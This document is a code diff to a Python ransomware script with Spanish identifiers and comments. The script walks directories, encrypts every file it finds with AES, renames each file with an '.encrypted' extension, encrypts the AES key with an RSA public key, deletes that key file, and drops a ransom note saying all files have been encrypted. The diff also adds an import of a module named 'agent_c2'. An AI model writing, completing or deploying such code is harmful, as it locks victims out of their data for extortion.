@@ -2,7 +2,11 @@ import os
 from Crypto.Cipher import AES, PKCS1_OAEP
 from Crypto.PublicKey import RSA
 from Crypto.Util.Padding import pad
-from find_files import recorrer_directorio  
+from find_files import recorrer_directorio
+import ctypes
+import os
+import agent_c2
+
 
 def cargar_clave():
     """
@@ -26,11 +30,27 @@ def cifrar_archivo(archivo, clave):
     
     with open(archivo, "rb") as f:
         datos = f.read()
-    
     datos_cifrados = cipher.encrypt(pad(datos, AES.block_size))
-    
     with open(archivo, "wb") as f:
         f.write(iv + datos_cifrados)  # Guardamos IV + datos cifrados
+
+def cifrar_clave_aes(clave_aes):
+    """
+    Cifra la clave AES con la clave pública RSA y la guarda en un archivo.
+    """
+    if not os.path.exists("rsa_public.pem"):
+        raise FileNotFoundError("El archivo de clave pública RSA 'rsa_public.pem' no se encuentra.")
+    
+    with open("rsa_public.pem", "rb") as f:
+        clave_publica = RSA.import_key(f.read())
+    
+    cipher_rsa = PKCS1_OAEP.new(clave_publica)
+    clave_cifrada = cipher_rsa.encrypt(clave_aes)
+    
+    with open("aes_key_encrypted.bin", "wb") as f:
+        f.write(clave_cifrada)
+    
+    print("Clave AES cifrada con RSA y guardada en aes_key_encrypted.bin.")
 
 def cifrar_archivos():
     """
@@ -52,29 +72,16 @@ def cifrar_archivos():
             cifrar_archivo(ruta_completa, clave)
             
             # Cambia la extensión del archivo a '.enc'
-            ruta_nueva = ruta_completa + ".enc"
+            ruta_nueva = ruta_completa + ".encrypted"
             os.rename(ruta_completa, ruta_nueva)
     
     print("Archivos cifrados y renombrados correctamente.")
     cifrar_clave_aes(clave)
-
-def cifrar_clave_aes(clave_aes):
-    """
-    Cifra la clave AES con la clave pública RSA y la guarda en un archivo.
-    """
-    if not os.path.exists("rsa_public.pem"):
-        raise FileNotFoundError("El archivo de clave pública RSA 'rsa_public.pem' no se encuentra.")
-    
-    with open("rsa_public.pem", "rb") as f:
-        clave_publica = RSA.import_key(f.read())
-    
-    cipher_rsa = PKCS1_OAEP.new(clave_publica)
-    clave_cifrada = cipher_rsa.encrypt(clave_aes)
-    
-    with open("aes_key_encrypted.bin", "wb") as f:
-        f.write(clave_cifrada)
-    
-    print("Clave AES cifrada con RSA y guardada en aes_key_encrypted.bin.")
+    os.remove("rsa_public.pem")
+    # Generar el reporte de archivos cifrados
+    directory_ransom_note = os.path.join(directorio_base, "ransom_note.txt")
+    with open(directory_ransom_note, "w") as ransom_note:
+            ransom_note.write("Todos tus archivos han sido cifrados\n")
 
 if __name__ == "__main__":
     cifrar_archivos()
